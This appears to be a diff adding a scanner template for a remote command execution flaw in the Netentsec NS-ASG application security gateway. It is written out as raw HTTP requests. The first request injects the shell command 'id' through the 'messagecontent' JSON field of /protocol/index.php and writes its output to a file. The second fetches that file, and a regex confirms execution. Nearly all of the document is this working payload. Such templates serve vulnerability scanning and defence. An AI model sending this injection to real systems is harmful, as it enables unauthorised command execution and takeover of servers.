@@ -1,0 +1,34 @@
+id: netentsec-ns-asg-rce
+
+info:
+  name: 网康 NS-ASG安全网关 index.php 远程命令执行漏洞
+  author: zan8in
+  severity: high
+  description: |
+    网康 NS-ASG安全网关 index.php文件存在远程命令执行漏洞，攻击者通过构造特殊的请求包可以获取服务器权限
+     title=="网康 NS-ASG 应用安全网关"
+
+http:
+  - raw:
+      - |
+        POST /protocol/index.php HTTP/1.1
+        Host: {{Hostname}}
+
+        jsoncontent={"protocolType":"getsysdatetime","messagecontent":"1;id>1.txt;"}
+
+      - |
+        GET /protocol/1.txt HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body_2
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)"
+        condition: and
+
+      - type: status
+        status:
+          - 200
